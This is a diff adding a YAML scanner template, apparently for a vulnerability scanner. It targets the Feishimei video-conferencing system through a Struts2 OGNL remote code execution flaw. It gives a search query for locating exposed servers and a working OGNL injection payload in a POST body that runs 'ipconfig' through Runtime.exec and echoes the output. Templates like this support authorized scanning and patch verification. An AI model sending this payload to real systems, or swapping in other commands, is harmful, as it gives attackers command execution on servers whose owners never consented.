@@ -1,0 +1,21 @@
+name: feishimei struts2 remote code
+manual: true
+query: title="飞视美视频会议系统"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /confinfoaction!showallConfinfos.action
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+      body: ('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'ipconfig\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"IP")
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
+  tags: rce
